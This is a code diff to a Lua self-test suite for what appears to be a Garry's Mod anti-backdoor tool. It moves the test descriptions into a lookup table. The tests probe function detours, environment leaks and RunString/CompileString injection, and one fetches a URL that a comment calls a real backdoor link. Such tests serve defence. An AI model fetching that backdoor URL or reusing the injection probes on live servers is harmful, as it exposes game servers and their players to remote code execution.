@@ -26,6 +26,12 @@ function BS:Debug_RunTests(args)
         { "tostring", "Try to check if a detoured function is valid" },
     }
 
+    tests.textAux = {}
+
+    for _,textTab in pairs(tests.text) do
+        tests.textAux[textTab[1]] = textTab[2]
+    end
+
     function tests.help()
         MsgC(self.colors.header, "\n  Available tests:\n\n")
         for _,textTab in pairs(tests.text) do
@@ -37,7 +43,7 @@ function BS:Debug_RunTests(args)
 
     function tests.detour()
         local bak = self.__G["timer"]["Simple"]
-        MsgC(self.colors.header, "\n-----> Detour: " .. tests.text["detour"] .. "\n")
+        MsgC(self.colors.header, "\n-----> Detour: " .. tests.textAux["detour"] .. "\n")
         local function detour()
             bak(0, function() end)
         end
@@ -54,14 +60,14 @@ function BS:Debug_RunTests(args)
     end
 
     function tests.detour2()
-        MsgC(self.colors.header, "\n-----> Detour2: " .. tests.text["detour2"] .. "\n")
+        MsgC(self.colors.header, "\n-----> Detour2: " .. tests.textAux["detour2"] .. "\n")
         local function detourSilent() end
         self.__G["http"]["Post"] = detourSilent
         MsgC(self.colors.message, "\n (Wainting) Detouring auto check test result pending... After some seconds: Pass = block execution; Fail = no alerts.\n\n")
     end
 
     function tests.getfenv()
-        MsgC(self.colors.header, "\n-----> getfenv: " .. tests.text["getfenv"] .. "\n")
+        MsgC(self.colors.header, "\n-----> getfenv: " .. tests.textAux["getfenv"] .. "\n")
         local env = self.__G.getfenv()
         print()
         if env == self.__G then
@@ -73,7 +79,7 @@ function BS:Debug_RunTests(args)
     end
 
     function tests.tostring()
-        MsgC(self.colors.header, "\n-----> tostring: " .. tests.text["tostring"] .. "\n")
+        MsgC(self.colors.header, "\n-----> tostring: " .. tests.textAux["tostring"] .. "\n")
         print()
         if string.find(self.__G.tostring(self.__G["jit"]["util"]["funcinfo"]), "builtin") then
             MsgC(self.colors.message, " (Pass) A selected detour (jit.util.funcinfo) is invisible.\n")
@@ -84,7 +90,7 @@ function BS:Debug_RunTests(args)
     end
 
     function tests.aux.debuggetfenv()
-        MsgC(self.colors.header, "\n-----> debug.getfenv: " .. tests.text["debug.getfenv"] .. "\n")
+        MsgC(self.colors.header, "\n-----> debug.getfenv: " .. tests.textAux["debug.getfenv"] .. "\n")
         local function this() end
         local env = self.__G.debug.getfenv(this)
         print()
@@ -98,7 +104,7 @@ function BS:Debug_RunTests(args)
     tests["debug.getfenv"] = tests.aux.debuggetfenv
 
     function tests.aux.httpFetch()
-        MsgC(self.colors.header, "\n-----> http.Fetch: " .. tests.text["http.Fetch"] .. "\n")
+        MsgC(self.colors.header, "\n-----> http.Fetch: " .. tests.textAux["http.Fetch"] .. "\n")
         self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
             MsgC(self.colors.message, "\nProhibited code is running inside http.Fetch!\n")
         end)
@@ -107,13 +113,13 @@ function BS:Debug_RunTests(args)
     tests["http.Fetch"] = tests.aux.httpFetch
 
     function tests.RunString()
-        MsgC(self.colors.header, "\n-----> RunString: " .. tests.text["RunString"] .. "\n")
+        MsgC(self.colors.header, "\n-----> RunString: " .. tests.textAux["RunString"] .. "\n")
         self.__G.RunString([[ BroadcastLua("print('')") print("\nProhibited code is running!")]]);
         MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
     end
 
     function tests.RunString2()
-        MsgC(self.colors.header, "\n-----> RunString2: " .. tests.text["RunString2"] .. "\n")
+        MsgC(self.colors.header, "\n-----> RunString2: " .. tests.textAux["RunString2"] .. "\n")
         self.__G.CompStrBypass = self.__G.CompileString
         self.__G.RunString([[ print("\n1") local two = CompStrBypass("print(2)") if isfunction(two) then two() end print("3")]]);
         self.__G.CompStrBypass = nil
@@ -121,13 +127,13 @@ function BS:Debug_RunTests(args)
     end
 
     function tests.RunStringEx()
-        MsgC(self.colors.header, "\n-----> RunStringEx: " .. tests.text["RunStringEx"] .. "\n")
+        MsgC(self.colors.header, "\n-----> RunStringEx: " .. tests.textAux["RunStringEx"] .. "\n")
         self.__G.RunStringEx([[RunString(print("Prohibited code is running!"))]]);
         MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
     end
 
     function tests.aux.debuggetinfo()
-        MsgC(self.colors.header, "\n-----> debug.getinfo: " .. tests.text["debug.getinfo"] .. "\n" .. "\n")
+        MsgC(self.colors.header, "\n-----> debug.getinfo: " .. tests.textAux["debug.getinfo"] .. "\n" .. "\n")
         PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))
         print()
         if self.__G.debug.getinfo(self.__G.RunString).short_src == "[C]" then
@@ -140,7 +146,7 @@ function BS:Debug_RunTests(args)
     tests["debug.getinfo"] = tests.aux.debuggetinfo
 
     function tests.aux.jitutilfuncinfo()
-        MsgC(self.colors.header, "\n-----> jit.util.funcinfo: " .. tests.text["jit.util.funcinfo"] .. "\n\n")
+        MsgC(self.colors.header, "\n-----> jit.util.funcinfo: " .. tests.textAux["jit.util.funcinfo"] .. "\n\n")
         PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))
         print()
         if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
@@ -153,7 +159,7 @@ function BS:Debug_RunTests(args)
     tests["jit.util.funcinfo"] = tests.aux.jitutilfuncinfo
 
     function tests.CompileFile()
-        MsgC(self.colors.header, "\n-----> CompileFile: " .. tests.text["CompileFile"] .. "\n")
+        MsgC(self.colors.header, "\n-----> CompileFile: " .. tests.textAux["CompileFile"] .. "\n")
         local compFile = self.__G.CompileFile("bs/server/libs/debug.lua")
         print()
         if not compFile then
@@ -165,7 +171,7 @@ function BS:Debug_RunTests(args)
     end
 
     function tests.CompileString()
-        MsgC(self.colors.header, "\n-----> CompileString: " .. tests.text["CompileString"] .. "\n")
+        MsgC(self.colors.header, "\n-----> CompileString: " .. tests.textAux["CompileString"] .. "\n")
         local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")
         print()
         if compStr == "" then
@@ -177,7 +183,7 @@ function BS:Debug_RunTests(args)
     end
 
     function tests.PersistentTrace()
-        MsgC(self.colors.header, "\n-----> PersistentTrace: " .. tests.text["PersistentTrace"] .. "\n")
+        MsgC(self.colors.header, "\n-----> PersistentTrace: " .. tests.textAux["PersistentTrace"] .. "\n")
         self.__G.CompStr = self.__G.CompileString
         self.__G.code = [[ return "2" ]]
         self.__G.timer.Simple(0, function()
